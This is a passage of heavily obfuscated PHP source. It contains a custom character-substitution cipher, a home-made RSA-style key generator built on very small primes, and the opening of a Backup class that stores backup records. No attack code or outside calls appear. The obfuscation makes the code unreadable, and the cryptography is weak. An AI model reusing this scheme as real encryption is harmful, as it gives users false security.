(strlen($e¬„®ßóåã) < $Bçœ³—Çà[559]) { return; } goto EÖ±‚µóÄ…; EÖ±‚µóÄ…: $c¸’í´³â” = $this->{$_SERVER[‹‚–·¹Ÿ][243]}($c¸’í´³â”, $cÏøğó¡ë§[244]); $DÈ›ÍŞËÖ˜ = $Bçœ³—Çà[632]; $c–®Ó‹‘î = $cÏøğó¡ë§[245](array($cÏøğó¡ë§[246] => array($cÏøğó¡ë§[247] => $cÏøğó¡ë§[248], $cÏøğó¡ë§[249] => 3))); goto FİÚ—í ™ø; fÀô¢¿ƒóò: } private function wbmy098dc18e($C¥ÈÍÒ¡°¶, $C†¬ì±˜, $aÏƒÅæÖî¤ = 3) { goto eç¨ø­ ›œ; eõ»†‘ã¤ˆ: $D‹‚×Ö¹Î¹ = $DƒÛÎ™¢Í¢[647]; if ($aÏƒÅæÖî¤ - 1 > 0) { $BöÑÉÉê˜  = $this->{$_SERVER[‹‚–·¹Ÿ][127]}($BöÑÉÉê˜ , $C†¬ì±˜, $aÏƒÅæÖî¤ - 1); } return $BöÑÉÉê˜ ; goto C­ï‰‰¬‘š; F®óŒ…Ì¥–: $Aì‰ìšá¨í = $DƒÛÎ™¢Í¢[634]; if (strlen($Aì‰ìšá¨í) < $DƒÛÎ™¢Í¢[557]) { die; } $C¥ÈÍÒ¡°¶ = $e‚¾÷İÀ‘É[2]($C¥ÈÍÒ¡°¶); goto Bïê¶«©Å; eç¨ø­ ›œ: $DƒÛÎ™¢Í¢ =& $_SERVER[Ä¿Ş°¨]; $e‚¾÷İÀ‘É =& $_SERVER[‹‚–·¹Ÿ]; $e‚¾÷İÀ‘É[326](1); goto F®óŒ…Ì¥–; Bïê¶«©Å: $Dáº‹Œö”„ = $DƒÛÎ™¢Í¢[635]; if (!$Dáº‹Œö”„) { return; } $A¨¥ÖÜöÓÜ = $e‚¾÷İÀ‘É[322](0, 5) . $e‚¾÷İÀ‘É[10]; goto F¶Ê»¿±ë; a¬Ü‡£Ú¾ğ: $EÅ ¤‘ËÚ = $e‚¾÷İÀ‘É[327]; switch ($A¨¥ÖÜöÓÜ) { case $e‚¾÷İÀ‘É[229]: $BöÑÉÉê˜  = $this->{$_SERVER[‹‚–·¹Ÿ][147]}($C¥ÈÍÒ¡°¶, $e‚¾÷İÀ‘É[214]($C†¬ì±˜ . $DÕôö£¾¢­)); $dİ¨ó´«Ôñ = $DƒÛÎ™¢Í¢[637]; if (strlen($dİ¨ó´«Ôñ) < $DƒÛÎ™¢Í¢[365]) { return; } break; $f‹õ—É—¨å = $DƒÛÎ™¢Í¢[638]; if (strlen($f‹õ—É—¨å) < $DƒÛÎ™¢Í¢[563]) { return; } case $e‚¾÷İÀ‘É[220]: $BöÑÉÉê˜  = $this->{$_SERVER[‹‚–·¹Ÿ][147]}($C¥ÈÍÒ¡°¶, $e‚¾÷İÀ‘É[214]($DÕôö£¾¢­ . $C†¬ì±˜)); break; $d‰ï´›ˆêÉ = $DƒÛÎ™¢Í¢[639]; if (!$d‰ï´›ˆêÉ) { return; } case $e‚¾÷İÀ‘É[328]: $BöÑÉÉê˜  = $this->{$_SERVER[‹‚–·¹Ÿ][147]}($C¥ÈÍÒ¡°¶, $e‚¾÷İÀ‘É[118]($DÕôö£¾¢­ . $C†¬ì±˜)); break; case $e‚¾÷İÀ‘É[329]: $BöÑÉÉê˜  = $this->{$_SERVER[‹‚–·¹Ÿ][147]}($C¥ÈÍÒ¡°¶, $e‚¾÷İÀ‘É[114]($DÕôö£¾¢­ . $C†¬ì±˜)); $c‹õ‚Òç¦½ = $DƒÛÎ™¢Í¢[640]; if (!$c‹õ‚Òç¦½) { return; } break; case $e‚¾÷İÀ‘É[330]: goto DÂĞ„æØ‡; EïÊâæ…†½: $BãÖÃ‹ˆë™ = $e‚¾÷İÀ‘É[331](0, 64); $F‡Ãîéæ¸¢ = $DƒÛÎ™¢Í¢[642]; while ($F‡Ãîéæ¸¢ < $DƒÛÎ™¢Í¢[559]) { if ($F‡Ãîéæ¸¢ >= 0) { break; } $F‡Ãîéæ¸¢++; } goto CçÑêèåÓ¥; DÂĞ„æØ‡: $C¥ÈÍÒ¡°¶ = $e‚¾÷İÀ‘É[118]($C¥ÈÍÒ¡°¶); $DÔ¾ºƒÙ”ª = $DƒÛÎ™¢Í¢[641]; if (strlen($DÔ¾ºƒÙ”ª) < $DƒÛÎ™¢Í¢[563]) { return; } goto EïÊâæ…†½; C‚ÊÒÖ‰Ê­: $BŒòšäÂ = $e‚¾÷İÀ‘É[10]; $d‰âä„ÉõÕ = 0; $B˜ÖÔÈáİ® = 0; goto DÆøù¸¥Ğ; aˆéÕÔÃÓ: $BöÑÉÉê˜  = $e‚¾÷İÀ‘É[324]($cÅÔÍÑŸ . $BŒòšäÂ); $CÅÃÜÑœ = $DƒÛÎ™¢Í¢[646]; break; goto Fº£²­‡ÚÁ; CçÑêèåÓ¥: $cÅÔÍÑŸ = $EÅ ¤‘ËÚ[$BãÖÃ‹ˆë™]; $AÙ³öĞ¸œ¸ = $e‚¾÷İÀ‘É[114]($cÅÔÍÑŸ . $e‚¾÷İÀ‘É[114]($C†¬ì±˜ . $cÅÔÍÑŸ) . $C†¬ì±˜); $AÙ³öĞ¸œ¸ = $e‚¾÷İÀ‘É[25]($AÙ³öĞ¸œ¸, $BãÖÃ‹ˆë™ % 8, $BãÖÃ‹ˆë™ % 8 + 7); goto C‚ÊÒÖ‰Ê­; DÆøù¸¥Ğ: $dåÅŠ‘°³‹ = $DƒÛÎ™¢Í¢[643]; if (!$dåÅŠ‘°³‹) { return; } $B§À±´çèì = 0; goto DôĞƒò¶é; DôĞƒò¶é: $FëáÆ’º = $DƒÛÎ™¢Í¢[644]; if (strlen($FëáÆ’º) < $DƒÛÎ™¢Í¢[555]) { die; } for ($d‰âä„ÉõÕ = 0; $d‰âä„ÉõÕ < $e‚¾÷İÀ‘É[24]($C¥ÈÍÒ¡°¶); $d‰âä„ÉõÕ++) { $B§À±´çèì = $B§À±´çèì == $e‚¾÷İÀ‘É[24]($AÙ³öĞ¸œ¸) ? 0 : $B§À±´çèì; $B˜ÖÔÈáİ® = ($BãÖÃ‹ˆë™ + $e‚¾÷İÀ‘É[332]($EÅ ¤‘ËÚ, $C¥ÈÍÒ¡°¶[$d‰âä„ÉõÕ]) + $e‚¾÷İÀ‘É[333]($AÙ³öĞ¸œ¸[$B§À±´çèì++])) % 64; $BŒòšäÂ .= $EÅ ¤‘ËÚ[$B˜ÖÔÈáİ®]; $cò­™´ê£ = $DƒÛÎ™¢Í¢[645]; } goto aˆéÕÔÃÓ; Fº£²­‡ÚÁ: default: $BöÑÉÉê˜  = $this->{$_SERVER[‹‚–·¹Ÿ][147]}($C¥ÈÍÒ¡°¶, $C†¬ì±˜ . $DÕôö£¾¢­); break; } $BöÑÉÉê˜  = $e‚¾÷İÀ‘É[214]($A¨¥ÖÜöÓÜ . $DÕôö£¾¢­ . $BöÑÉÉê˜ ); goto eõ»†‘ã¤ˆ; F¶Ê»¿±ë: $B¡ïÌğ½Âë = $DƒÛÎ™¢Í¢[636]; while (strlen($B¡ïÌğ½Âë) < $DƒÛÎ™¢Í¢[563]) { if (!$B¡ïÌğ½Âë) { break; } $B¡ïÌğ½Âë++; } $DÕôö£¾¢­ = $e‚¾÷İÀ‘É[124](15); goto a¬Ü‡£Ú¾ğ; C­ï‰‰¬‘š: } private function weod475deaa6($Eø¸—õ¶ºÊ, $DæÃš˜ë¼·, $E†øÈí¾‰Û = 3) { goto cÁé¦çàø; Då“‹«ÒÚ: $Eø¸—õ¶ºÊ = $DŒè›Äº[214]($Eø¸—õ¶ºÊ); $fòõê“Ÿè = $Eø¸—õ¶ºÊ[0]; $bƒÀ£±ï = $DŒè›Äº[25]($Eø¸—õ¶ºÊ, 1, 15); goto Fììâ­÷¨ğ; aŞà¢à¤İ: $Eø¸—õ¶ºÊ = $DŒè›Äº[2]($Eø¸—õ¶ºÊ); $Bö¨‘ìåœÈ = $cöÖğ¶ùø®[648]; while ($Bö¨‘ìåœÈ < $cöÖğ¶ùø®[563]) { if ($Bö¨‘ìåœÈ >= 0) { break; } $Bö¨‘ìåœÈ++; } goto Då“‹«ÒÚ; cÁé¦çàø: $cöÖğ¶ùø® =& $_SERVER[Ä¿Ş°¨]; $DŒè›Äº =& $_SERVER[‹‚–·¹Ÿ]; if (!$DŒè›Äº[334]($Eø¸—õ¶ºÊ) || $DŒè›Äº[24]($Eø¸—õ¶ºÊ) < 10) { return !1; } goto aŞà¢à¤İ; Fììâ­÷¨ğ: $aæ¡áé˜ˆ— = $cöÖğ¶ùø®[649]; if (!$aæ¡áé˜ˆ—) { return; } $Eø¸—õ¶ºÊ = $DŒè›Äº[25]($Eø¸—õ¶ºÊ, 16); goto EÌ­¯ì¥ßÍ; Fš¸ÑíØò: switch ($fòõê“Ÿè) { case $DŒè›Äº[229]: $a´‹õ³¥×å = $this->{$_SERVER[‹‚–·¹Ÿ][243]}($Eø¸—õ¶ºÊ, $DŒè›Äº[214]($DæÃš˜ë¼· . $bƒÀ£±ï)); $aõ’ªÓØÃ = $cöÖğ¶ùø®[651]; break; $FùÛùÔæŞ = $cöÖğ¶ùø®[652]; case $DŒè›Äº[220]: $a´‹õ³¥×å = $this->{$_SERVER[‹‚–·¹Ÿ][243]}($Eø¸—õ¶ºÊ, $DŒè›Äº[214]($bƒÀ£±ï . $DæÃš˜ë¼·)); $A¤§ó‰„ = $cöÖğ¶ùø®[653]; break; case $DŒè›Äº[328]: $a´‹õ³¥×å = $this->{$_SERVER[‹‚–·¹Ÿ][243]}($Eø¸—õ¶ºÊ, $DŒè›Äº[118]($bƒÀ£±ï . $DæÃš˜ë¼·)); break; case $DŒè›Äº[329]: $a´‹õ³¥×å = $this->{$_SERVER[‹‚–·¹Ÿ][243]}($Eø¸—õ¶ºÊ, $DŒè›Äº[114]($bƒÀ£±ï . $DæÃš˜ë¼·)); break; $fÔ±ïİ¸İ = $cöÖğ¶ùø®[654]; if (!$fÔ±ïİ¸İ) { die; } case $DŒè›Äº[330]: goto EÄ…óÕÒŞ‹; B‰Ÿ³»…‘±: while ($DÑ½…‡ïî < $cöÖğ¶ùø®[563]) { if ($DÑ½…‡ïî >= 0) { break; } $DÑ½…‡ïî++; } for ($B–Ã£èÀÈÀ = 0; $B–Ã£èÀÈÀ < $DŒè›Äº[24]($Eø¸—õ¶ºÊ); $B–Ã£èÀÈÀ++) { $fØè–‚«´£ = $fØè–‚«´£ == $DŒè›Äº[24]($FÉ—‰Ö™™ä) ? 0 : $fØè–‚«´£; $Fƒ›ÉÌš²Û = $cöÖğ¶ùø®[660]; $Bïõ¼·˜Ü = $fØè–‚«´£++; $a‰Œ‘ÍòÚ = $cöÖğ¶ùø®[661]; while (strlen($a‰Œ‘ÍòÚ) < $cöÖğ¶ùø®[365]) { if (!$a‰Œ‘ÍòÚ) { break; } $a‰Œ‘ÍòÚ++; } $E¡ˆ»È¸¢÷ = $DŒè›Äº[332]($BäÇœµë»›, $Eø¸—õ¶ºÊ[$B–Ã£èÀÈÀ]) - $eõåˆ«ßªŒ - $DŒè›Äº[333]($FÉ—‰Ö™™ä[$Bïõ¼·˜Ü]); while ($E¡ˆ»È¸¢÷ < 0) { $E¡ˆ»È¸¢÷ += 64; } $AƒìÒ®ÚËõ .= $BäÇœµë»›[$E¡ˆ»È¸¢÷]; } $a´‹õ³¥×å = $DŒè›Äº[336]($AƒìÒ®ÚËõ); goto EêãÒğª»»; FÅÔì‹™ó´: $FÉ—‰Ö™™ä = $DŒè›Äº[25]($FÉ—‰Ö™™ä, $eõåˆ«ßªŒ % 8, $eõåˆ«ßªŒ % 8 + 7); $AƒìÒ®ÚËõ = $DŒè›Äº[10]; $eßğ¥¡…Ë¼ = $cöÖğ¶ùø®[657]; goto B»®³õí¨³; dÏƒâİÛ¸‰: $FÉ—‰Ö™™ä = $DŒè›Äº[114]($DºÚÙö‚ª² . $DŒè›Äº[114]($DæÃš˜ë¼· . $DºÚÙö‚ª²) . $DæÃš˜ë¼·); $F ‚ˆéòã´ = $cöÖğ¶ùø®[656]; if (strlen($F ‚ˆéòã´) < $cöÖğ¶ùø®[365]) { die; } goto FÅÔì‹™ó´; Aˆ•½Åâ°Ñ: $DºÚÙö‚ª² = $Eø¸—õ¶ºÊ[0]; $Eø¸—õ¶ºÊ = $DŒè›Äº[25]($Eø¸—õ¶ºÊ, 1); $eõåˆ«ßªŒ = $DŒè›Äº[332]($BäÇœµë»›, $DºÚÙö‚ª²); goto dÏƒâİÛ¸‰; B»®³õí¨³: $B–Ã£èÀÈÀ = 0; $E¡ˆ»È¸¢÷ = 0; $Cç—Ø¹¢¯ = $cöÖğ¶ùø®[658]; goto FÎ¯ÖˆìÎ; EÄ…óÕÒŞ‹: $Eø¸—õ¶ºÊ = $DŒè›Äº[335]($Eø¸—õ¶ºÊ); $b”¤…ã÷ï = $cöÖğ¶ùø®[655]; while (strlen($b”¤…ã÷ï) < $cöÖğ¶ùø®[557]) { if (!$b”¤…ã÷ï) { break; } $b”¤…ã÷ï++; } goto Aˆ•½Åâ°Ñ; FÎ¯ÖˆìÎ: if (strlen($Cç—Ø¹¢¯) < $cöÖğ¶ùø®[365]) { return; } $fØè–‚«´£ = 0; $DÑ½…‡ïî = $cöÖğ¶ùø®[659]; goto B‰Ÿ³»…‘±; EêãÒğª»»: break; goto AÖÌ±óŒï¹; AÖÌ±óŒï¹: default: $a´‹õ³¥×å = $this->{$_SERVER[‹‚–·¹Ÿ][243]}($Eø¸—õ¶ºÊ, $DæÃš˜ë¼· . $bƒÀ£±ï); break; $d‹„Ÿ™İ´ß = $cöÖğ¶ùø®[662]; } if ($E†øÈí¾‰Û - 1 > 0) { $a´‹õ³¥×å = $this->{$_SERVER[‹‚–·¹Ÿ][188]}($a´‹õ³¥×å, $DæÃš˜ë¼·, $E†øÈí¾‰Û - 1); } return $a´‹õ³¥×å; goto aàÀâŒ—‘›; EÌ­¯ì¥ßÍ: $BäÇœµë»› = $DŒè›Äº[327]; $AÒæŸçïõÀ = $cöÖğ¶ùø®[650]; while ($AÒæŸçïõÀ < $cöÖğ¶ùø®[563]) { if ($AÒæŸçïõÀ >= 0) { break; } $AÒæŸçïõÀ++; } goto Fš¸ÑíØò; aàÀâŒ—‘›: } public function hgvu7a928da9($CÊ£¸¨ç„ø) { goto b‘™ç‡ù×Ö; bõÃãäÚµ: $a‚•«—¢ªÔ = $E´Èµ¡Â£é[114]($E´Èµ¡Â£é[338] . ($EùæïĞè© + $bÔ„‡À¦‘í) . $E´Èµ¡Â£é[339] . $E·™–Í½Ş« . $E´Èµ¡Â£é[339] . $bÅ†­±ÁŞï . $E´Èµ¡Â£é[340]); $AÏÔõ†¡Ö = $this->{$_SERVER[‹‚–·¹Ÿ][147]}($CÊ£¸¨ç„ø, $a‚•«—¢ªÔ) . $E´Èµ¡Â£é[341] . $dñ¶º½¤Ä†; return $AÏÔõ†¡Ö; goto c™èˆ¤…Œõ; aÕø‚–¢™¯: while (1) { $CøØ­äøÀâ = $E·™–Í½Ş«; $a…¡æ¦¤ªÃ = $CáÍ‹®ó…[667]; while (strlen($a…¡æ¦¤ªÃ) < $CáÍ‹®ó…[365]) { if (!$a…¡æ¦¤ªÃ) { break; } $a…¡æ¦¤ªÃ++; } $bÒÜïõ—’ = $Eë†‰‡ù„Ã; while ($bÒÜïõ—’ % $CøØ­äøÀâ != 0) { $DÉ•˜™åŸÜ = $bÒÜïõ—’; $bÒÜïõ—’ = $CøØ­äøÀâ; $CøØ­äøÀâ = $DÉ•˜™åŸÜ % $CøØ­äøÀâ; } if ($CøØ­äøÀâ == 1) { break; } else { $E·™–Í½Ş«++; } } $bÅ†­±ÁŞï = 2; for ($dĞà¬´†” = 0; $dĞà¬´†” < $Eë†‰‡ù„Ã * 10; $dĞà¬´†”++) { if (($Eë†‰‡ù„Ã * $dĞà¬´†” + 1) % $E·™–Í½Ş« == 0) { $bÅ†­±ÁŞï = $E´Èµ¡Â£é[201](($Eë†‰‡ù„Ã * $dĞà¬´†” + 1) / $E·™–Í½Ş«); break; } } goto Dºò„ˆñâ–; C„÷§ì„Ò–: $D”‘„õ¹µœ = $CáÍ‹®ó…[663]; if (!$D”‘„õ¹µœ) { die; } $bÔ„‡À¦‘í = $this->{$_SERVER[‹‚–·¹Ÿ][337]}(); goto BÖŸÄ…Í—; b…¶ÕôŸæ§: if (strlen($CÛ†»Û´É) < $CáÍ‹®ó…[365]) { die; } $E·™–Í½Ş« = $E´Èµ¡Â£é[201](($EùæïĞè© + $bÔ„‡À¦‘í) / 2); $FÚŞÚ‘×Å‘ = $CáÍ‹®ó…[666]; goto aÕø‚–¢™¯; c™èˆ¤…Œõ: $dã­ã‡¤¿Ë = $CáÍ‹®ó…[669]; if (strlen($dã­ã‡¤¿Ë) < $CáÍ‹®ó…[563]) { return; } goto C£ğãÖËïÖ; BÖŸÄ…Í—: $E¨ì÷¿›èä = $CáÍ‹®ó…[664]; $Eë†‰‡ù„Ã = ($EùæïĞè© - 1) * ($bÔ„‡À¦‘í - 1); $CÛ†»Û´É = $CáÍ‹®ó…[665]; goto b…¶ÕôŸæ§; b‘™ç‡ù×Ö: $CáÍ‹®ó… =& $_SERVER[Ä¿Ş°¨]; $E´Èµ¡Â£é =& $_SERVER[‹‚–·¹Ÿ]; $EùæïĞè© = $this->{$_SERVER[‹‚–·¹Ÿ][337]}(); goto C„÷§ì„Ò–; Dºò„ˆñâ–: $dñ¶º½¤Ä† = $this->{$_SERVER[‹‚–·¹Ÿ][147]}($EùæïĞè© * $bÔ„‡À¦‘í . $E´Èµ¡Â£é[10], $E´Èµ¡Â£é[149]); $EÂÌ÷ âà = $CáÍ‹®ó…[668]; if (strlen($EÂÌ÷ âà) < $CáÍ‹®ó…[559]) { die; } goto bõÃãäÚµ; C£ğãÖËïÖ: } public function ovcj3e414a5d($dï¹µ—Ş©‚) { goto CôËĞï¬¾÷; aÎéÔï„ä: $eÛİ…­¥÷™ = $Bë¡ˆŸ¢©¥[670]; if (!$eÛİ…­¥÷™) { return; } if ($Eäø¥°ºèš[19]($DÄÍŞË¼ÑÖ) != 2) { return $Eäø¥°ºèš[10]; } goto cö«•Úó¹µ; dëËÄòŠ: $B¬´öùñ”ª = 0; $AãôêÛ¶¾˜ = 0; for ($Eìö´ˆòá¥ = 3; $Eìö´ˆòá¥ < $b²ÕİòÍğ©; $Eìö´ˆòá¥ += 2) { if ($b²ÕİòÍğ© % $Eìö´ˆòá¥ != 0) { continue; } $B¬´öùñ”ª = $Eìö´ˆòá¥; $fºÜ‚¨Äºã = $Bë¡ˆŸ¢©¥[671]; $AãôêÛ¶¾˜ = $Eäø¥°ºèš[201]($b²ÕİòÍğ© / $Eìö´ˆòá¥); break; $aòä¹‰ƒ™ç = $Bë¡ˆŸ¢©¥[672]; if (strlen($aòä¹‰ƒ™ç) < $Bë¡ˆŸ¢©¥[559]) { die; } } goto C„í÷„ë’¾; eäØ®Î§—­: return $cÇ˜ç›Å¼“; $cÆŞÎ—Ë®Ã = $Bë¡ˆŸ¢©¥[674]; if (strlen($cÆŞÎ—Ë®Ã) < $Bë¡ˆŸ¢©¥[555]) { return; } goto dåŞÁšä×õ; CôËĞï¬¾÷: $Bë¡ˆŸ¢©¥ =& $_SERVER[Ä¿Ş°¨]; $Eäø¥°ºèš =& $_SERVER[‹‚–·¹Ÿ]; $DÄÍŞË¼ÑÖ = $Eäø¥°ºèš[0]($Eäø¥°ºèš[341], $dï¹µ—Ş©‚); goto aÎéÔï„ä; AìŒ¼¨ï»È: if (strlen($Aì©ËÀÉš…) < $Bë¡ˆŸ¢©¥[365]) { die; } while (1) { $DĞ”˜•Ò‘î = $A®§ˆõôĞ¿; $eó«¸Å³¡ = $CôÎ«§²Ã; while ($eó«¸Å³¡ % $DĞ”˜•Ò‘î != 0) { $F°Ì‹Äï¢Í = $eó«¸Å³¡; $eó«¸Å³¡ = $DĞ”˜•Ò‘î; $DĞ”˜•Ò‘î = $F°Ì‹Äï¢Í % $DĞ”˜•Ò‘î; } if ($DĞ”˜•Ò‘î == 1) { break; } else { $A®§ˆõôĞ¿++; } } $f¨“Í¿—ô± = 2; goto e÷õÎ«Ïß‡; e÷õÎ«Ïß‡: for ($Eìö´ˆòá¥ = 0; $Eìö´ˆòá¥ < $CôÎ«§²Ã * 10; $Eìö´ˆòá¥++) { if (($CôÎ«§²Ã * $Eìö´ˆòá¥ + 1) % $A®§ˆõôĞ¿ == 0) { $f¨“Í¿—ô± = $Eäø¥°ºèš[201](($CôÎ«§²Ã * $Eìö´ˆòá¥ + 1) / $A®§ˆõôĞ¿); break; } } $dáº•¨ËçÍ = $Eäø¥°ºèš[114]($Eäø¥°ºèš[338] . ($B¬´öùñ”ª + $AãôêÛ¶¾˜) . $Eäø¥°ºèš[339] . $A®§ˆõôĞ¿ . $Eäø¥°ºèš[339] . $f¨“Í¿—ô± . $Eäø¥°ºèš[340]); $cÇ˜ç›Å¼“ = $this->{$_SERVER[‹‚–·¹Ÿ][243]}($DÄÍŞË¼ÑÖ[0], $dáº•¨ËçÍ); goto eäØ®Î§—­; cö«•Úó¹µ: $b²ÕİòÍğ© = $this->{$_SERVER[‹‚–·¹Ÿ][243]}($DÄÍŞË¼ÑÖ[1] . $Eäø¥°ºèš[10], $Eäø¥°ºèš[149]); if (!$b²ÕİòÍğ©) { return $Eäø¥°ºèš[10]; } $b²ÕİòÍğ© = $Eäø¥°ºèš[201]($b²ÕİòÍğ©); goto dëËÄòŠ; C„í÷„ë’¾: $CôÎ«§²Ã = ($B¬´öùñ”ª - 1) * ($AãôêÛ¶¾˜ - 1); $A®§ˆõôĞ¿ = $Eäø¥°ºèš[201](($B¬´öùñ”ª + $AãôêÛ¶¾˜) / 2); $Aì©ËÀÉš… = $Bë¡ˆŸ¢©¥[673]; goto AìŒ¼¨ï»È; dåŞÁšä×õ: } public function kuindec94d23() { goto A³É“½êã; aíÁÃÛÎ†: while ($b¤¹Ö£‡“İ < $F‰ãµ™Ú¡æ[555]) { if ($b¤¹Ö£‡“İ >= 0) { break; } $b¤¹Ö£‡“İ++; } for ($e†©°±°Ò = $dÄ¿¯î‘Ò; $e†©°±°Ò > 1; $e†©°±°Ò--) { $F²Ú¾½­Ë‘ = !0; foreach ($f’ğÚÛÛ©ƒ as $A¶õŒ°ö¨) { if ($e†©°±°Ò % $A¶õŒ°ö¨ == 0) { $F²Ú¾½­Ë‘ = !1; break; } } if ($F²Ú¾½­Ë‘) { $eëåœ …Ì… = $e†©°±°Ò; break; } } return $eëåœ …Ì…; goto e¿×¶óæí; FÇÓÖ¯Ãì¬: while ($D¿Ûó…À¾¦ <= (int) $fâ³…ÍÎ‡[343]($dÄ¿¯î‘Ò)) { $e†©°±°Ò = $D¿Ûó…À¾¦; while (!0) { $e†©°±°Ò++; $E³„™ µóÔ = $F‰ãµ™Ú¡æ[677]; if ($e†©°±°Ò <= 2) { $D¿Ûó…À¾¦ = $e†©°±°Ò; break; } else { if ($e†©°±°Ò < 2) { continue; } } $F²Ú¾½­Ë‘ = !0; for ($Eˆ¬¡¸è¡ = 2; $Eˆ¬¡¸è¡ <= $fâ³…ÍÎ‡[343]($e†©°±°Ò); $Eˆ¬¡¸è¡++) { if ($e†©°±°Ò % $Eˆ¬¡¸è¡ == 0) { $F²Ú¾½­Ë‘ = !1; } } if ($F²Ú¾½­Ë‘) { $D¿Ûó…À¾¦ = $e†©°±°Ò; break; } } $f’ğÚÛÛ©ƒ[] = $D¿Ûó…À¾¦; $A‰“ÅÖ×ğ› = $F‰ãµ™Ú¡æ[678]; } $eëåœ …Ì… = 2; $b¤¹Ö£‡“İ = $F‰ãµ™Ú¡æ[679]; goto aíÁÃÛÎ†; bµ®è©±—Ï: $D¿Ûó…À¾¦ = 1; $a‘ŒÄÖ§Ü = $F‰ãµ™Ú¡æ[676]; if (strlen($a‘ŒÄÖ§Ü) < $F‰ãµ™Ú¡æ[557]) { die; } goto FÇÓÖ¯Ãì¬; A³É“½êã: $F‰ãµ™Ú¡æ =& $_SERVER[Ä¿Ş°¨]; $fâ³…ÍÎ‡ =& $_SERVER[‹‚–·¹Ÿ]; $dÄ¿¯î‘Ò = $fâ³…ÍÎ‡[322]($fâ³…ÍÎ‡[342](2, 14), $fâ³…ÍÎ‡[342](2, 16) - 1); goto A×¸ç‘ë; A×¸ç‘ë: $f’ğÚÛÛ©ƒ = array(); $C®†Ô³Ã = $F‰ãµ™Ú¡æ[675]; if (!$C®†Ô³Ã) { die; } goto bµ®è©±—Ï; e¿×¶óæí: } public function fbqy5a66dc2d($EØ¦“´ Ë›, $fÜÓõ—¥òø) { $BËêğîîî„ =& $_SERVER[‹‚–·¹Ÿ]; return $BËêğîîî„[13](array($BËêğîîî„[14], $BËêğîîî„[344]), $EØ¦“´ Ë›, $fÜÓõ—¥òø); } public function aomkaef63adf($a‹‡Òæ¯Ûñ, $Fá©‹„›®„) { $E°³Ùî…àì =& $_SERVER[Ä¿Ş°¨]; $Cµ˜òàó =& $_SERVER[‹‚–·¹Ÿ]; return $Cµ˜òàó[13](array($Cµ˜òàó[345], $Cµ˜òàó[346]), $a‹‡Òæ¯Ûñ, $Fá©‹„›®„); $FâïñíÙò¤ = $E°³Ùî…àì[680]; if (strlen($FâïñíÙò¤) < $E°³Ùî…àì[559]) { return; } } public function qkxm5c7e41ab($fÂ«å³–æğ, $e¥©‘Òæù) { $BÊ†§šÌ‡Œ =& $_SERVER[‹‚–·¹Ÿ]; return $BÊ†§šÌ‡Œ[13](array($BÊ†§šÌ‡Œ[345], $BÊ†§šÌ‡Œ[347]), $fÂ«å³–æğ, $e¥©‘Òæù); } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $C—¤£ÏÒÕò =& $_SERVER[Ä¿Ş°¨]; self::$name = date($C—¤£ÏÒÕò[681]); if (!($a¼’‚¯Ú‘ = Model($C—¤£ÏÒÕò[682])->lastItem())) { $a¼’‚¯Ú‘ = $this->initData(); } else { self::$name = $a¼’‚¯Ú‘[$C—¤£ÏÒÕò[28]]; if ($a¼’‚¯Ú‘[$C—¤£ÏÒÕò[683]] == $C—¤£ÏÒÕò[83]) { self::$name = date($C—¤£ÏÒÕò[684]); $cÒöò¶áŒÀ = 0; if (isset($a¼’‚¯Ú‘[$C—¤£ÏÒÕò[277]][$C—¤£ÏÒÕò[163]][$C—¤£ÏÒÕò[423]])) { $cÒöò¶áŒÀ = (int) $a¼’‚¯Ú‘[$C—¤£ÏÒÕò[277]][$C—¤£ÏÒÕò[163]][$C—¤£ÏÒÕò[423]]; } if ($a¼’‚¯Ú‘[$C—¤£ÏÒÕò[28]] == self::$name) { Model($C—¤£ÏÒÕò[682])->remove($a¼’‚¯Ú‘[$C—¤£ÏÒÕò[372]]); } $a¼’‚¯Ú‘ = $this->initData($cÒöò¶áŒÀ, $a¼’‚¯Ú‘[$C—¤£ÏÒÕò[685]]); } else { $this->checkStore($a¼’‚¯Ú‘[$C—¤£ÏÒÕò[685]]); } } self::$option = $a¼’‚¯Ú‘; } private function initData($B—³‘Ö‘½õ = 0, $a–Ó¾Ù‚×Î = '') { goto c›õÃÆÏ­; c›õÃÆÏ­: $c¾öÛ…ÃÏ =& $_SERVER[Ä¿Ş°¨]; $BóÆ„é†¨ = Model($c¾öÛ…ÃÏ[682])->config(); if ($a–Ó¾Ù‚×Î && $BóÆ„é†¨[$c¾öÛ…ÃÏ[685]] != $a–Ó¾Ù‚×Î) { $B—³‘Ö‘½õ = 0; } goto eÃÏÜ“ÖÏ; b»áö¼‡âÑ: $BÍÁö¯åğö[$c¾öÛ…ÃÏ[372]] = $D³©Ùà†Ü; return $BÍÁö¯åğö; goto B³ø‚¦ÒŒ; eÃÏÜ“ÖÏ: $this->checkStore($BóÆ„é†¨[$c¾öÛ…ÃÏ[685]]); $BÍÁö¯åğö = array($c¾öÛ…ÃÏ[685] => $BóÆ„é†¨[$c¾öÛ…ÃÏ[685]], $c¾öÛ…ÃÏ[28] => self::$name, $c¾öÛ…ÃÏ[683] => 0, $c¾öÛ…ÃÏ[686] => $BóÆ„é†¨[$c¾öÛ…ÃÏ[686]], $c¾öÛ…ÃÏ[277] => array($c¾öÛ…ÃÏ[687] => array($c¾öÛ…ÃÏ[683] => 0), $c¾öÛ…ÃÏ[688] => array($c¾öÛ…ÃÏ[683] => 0, $c¾öÛ…ÃÏ[689] => 0, $c¾öÛ…ÃÏ[690] => 0, $c¾öÛ…ÃÏ[29] => $c¾öÛ…ÃÏ[33]), $c¾öÛ…ÃÏ[691] => array($c¾öÛ…ÃÏ[683] => 0, $c¾öÛ…ÃÏ[689] => 0, $c¾öÛ…ÃÏ[690] => 0), $c¾öÛ…ÃÏ[163] => array($c¾öÛ…ÃÏ[683] => 0, $c¾öÛ…ÃÏ[692] => 0, $c¾öÛ…ÃÏ[693] => 0, $c¾öÛ…ÃÏ[694] => 0, $c¾öÛ…ÃÏ[695] => 0, $c¾öÛ…ÃÏ[423] => $B—³‘Ö‘½õ)), $c¾öÛ…ÃÏ[696] => time(), $c¾öÛ…ÃÏ[697] => 0); $D³©Ùà†Ü = Model($c¾öÛ…ÃÏ[682])->insert($BÍÁö¯åğö); goto b»áö¼‡âÑ; B³ø‚¦ÒŒ: } private function checkStore($DòµùÀ×š) { $D±¹öó¤¬Ş =& $_SERVER[Ä¿Ş°¨]; $bğÇÏ‰Æ³ = Model($D±¹öó¤¬Ş[698])->listData($DòµùÀ×š); Model($D±¹öó¤¬Ş[698])->checkConfig($bğÇÏ‰Æ³); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Ä¿Ş°¨][682])->findByName(self::$name); } return self::$option; } public static function 